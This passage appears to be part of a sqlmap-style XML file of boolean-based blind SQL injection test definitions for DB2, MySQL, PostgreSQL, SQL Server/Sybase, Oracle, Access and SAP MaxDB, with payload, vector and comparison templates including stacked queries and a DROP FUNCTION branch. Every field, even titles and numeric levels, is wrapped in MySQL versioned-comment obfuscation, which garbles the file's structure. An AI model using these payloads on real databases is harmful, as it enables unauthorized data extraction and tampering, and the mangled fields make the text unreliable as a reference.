            <payload>/*!50000,(SELECT CASE WHEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE RAISE_ERROR(70001, '/**_**/*//*!50000[RANDSTR]/**_**/*//*!50000') END FROM SYSIBM.SYSDUMMY1)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000,(SELECT CASE WHEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE RAISE_ERROR(70001, '/**_**/*//*!50000[RANDSTR]/**_**/*//*!50000') END FROM SYSIBM.SYSDUMMY1)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000IBM DB2/**_**/*/</dbms>
        </details>
    </test>

    
    <test>
        <title>/*!50000HAVING boolean-based blind - WHERE, GROUP BY clause/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,2/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000HAVING/**_**/*//*!50000[INFERENCE]/**_**/*/</vector>
        <request>
            <payload>/*!50000HAVING/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000HAVING/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*/</comparison>
        </response>
    </test>
    

    
    <test>
        <title>/*!50000MySQL &gt;= 5.0 boolean-based blind - Stacked queries/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500004/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001-8/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000;SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM INFORMATION_SCHEMA.PLUGINS) END)/**_**/*/</vector>
        <request>
            <payload>/*!50000;SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM INFORMATION_SCHEMA.PLUGINS) END)/**_**/*/</payload>
            <comment>/*!50000#/**_**/*/</comment>
        </request>
        <response>
            <comparison>/*!50000;SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM INFORMATION_SCHEMA.PLUGINS) END)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
            <dbms_version>/*!50000&gt;= 5.0/**_**/*/</dbms_version>
        </details>
    </test>

    <test>
        <title>/*!50000MySQL &lt; 5.0 boolean-based blind - Stacked queries/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500005/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001-8/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000;SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM INFORMATION_SCHEMA.PLUGINS) END)/**_**/*/</vector>
        <request>
            <payload>/*!50000;SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM INFORMATION_SCHEMA.PLUGINS) END)/**_**/*/</payload>
            <comment>/*!50000#/**_**/*/</comment>
        </request>
        <response>
            <comparison>/*!50000;SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM INFORMATION_SCHEMA.PLUGINS) END)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
            <dbms_version>/*!50000&lt; 5.0/**_**/*/</dbms_version>
        </details>
    </test>

    <test>
        <title>/*!50000PostgreSQL boolean-based blind - Stacked queries/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001-8/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000;SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE 1/(SELECT 0) END)/**_**/*/</vector>
        <request>
            <payload>/*!50000;SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE 1/(SELECT 0) END)/**_**/*/</payload>
            <comment>/*!50000--/**_**/*/</comment>
        </request>
        <response>
            <comparison>/*!50000;SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE 1/(SELECT 0) END)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000PostgreSQL/**_**/*/</dbms>
        </details>
    </test>

    
    <test>
        <title>/*!50000PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500005/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001-8/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000;SELECT * FROM GENERATE_SERIES(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN 1 ELSE 0 END) LIMIT 1/**_**/*/</vector>
        <request>
            <payload>/*!50000;SELECT * FROM GENERATE_SERIES(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN 1 ELSE 0 END) LIMIT 1/**_**/*/</payload>
            <comment>/*!50000--/**_**/*/</comment>
        </request>
        <response>
            <comparison>/*!50000;SELECT * FROM GENERATE_SERIES(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN 1 ELSE 0 END) LIMIT 1/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000PostgreSQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001-8/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000;IF(/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE DROP FUNCTION/**_**/*//*!50000[RANDSTR]/**_**/*/</vector>
        <request>
            <payload>/*!50000;IF(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE DROP FUNCTION/**_**/*//*!50000[RANDSTR]/**_**/*/</payload>
            <comment>/*!50000--/**_**/*/</comment>
        </request>
        <response>
            <comparison>/*!50000;IF(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE DROP FUNCTION/**_**/*//*!50000[RANDSTR]/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Microsoft SQL Server/**_**/*/</dbms>
            <dbms>/*!50000Sybase/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000Microsoft SQL Server/Sybase boolean-based blind - Stacked queries/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500004/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001-8/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000;SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN 1 ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000UNION ALL SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) END)/**_**/*/</vector>
        <request>
            <payload>/*!50000;SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN 1 ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000UNION ALL SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) END)/**_**/*/</payload>
            <comment>/*!50000--/**_**/*/</comment>
        </request>
        <response>
            <comparison>/*!50000;SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN 1 ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000UNION ALL SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) END)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Microsoft SQL Server/**_**/*/</dbms>
            <dbms>/*!50000Sybase/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000Oracle boolean-based blind - Stacked queries/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500004/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001-8/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000;SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL/**_**/*/</vector>
        <request>
            <payload>/*!50000;SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL/**_**/*/</payload>
            <comment>/*!50000--/**_**/*/</comment>
        </request>
        <response>
            <comparison>/*!50000;SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Oracle/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000Microsoft Access boolean-based blind - Stacked queries/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500005/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001-8/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000;IIF(/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000,1,1/0)/**_**/*/</vector>
        <request>
            <payload>/*!50000;IIF(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,1,1/0)/**_**/*/</payload>
            <comment>/*!50000%16/**_**/*/</comment>
        </request>
        <response>
            <comparison>/*!50000;IIF(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000,1,1/0)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Microsoft Access/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000SAP MaxDB boolean-based blind - Stacked queries/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500005/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001-8/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000;SELECT CASE WHEN/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000THEN 1 ELSE NULL END/**_**/*/</vector>
        <request>
            <payload>/*!50000;SELECT CASE WHEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000THEN 1 ELSE NULL END/**_**/*/</payload>
            <comment>/*!50000--/**_**/*/</comment>
        </request>
        <response>
            <comparison>/*!50000;SELECT CASE WHEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000THEN 1 ELSE NULL END/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000SAP MaxDB/**_**/*/</dbms>
        </details>
    </test>
    
</root>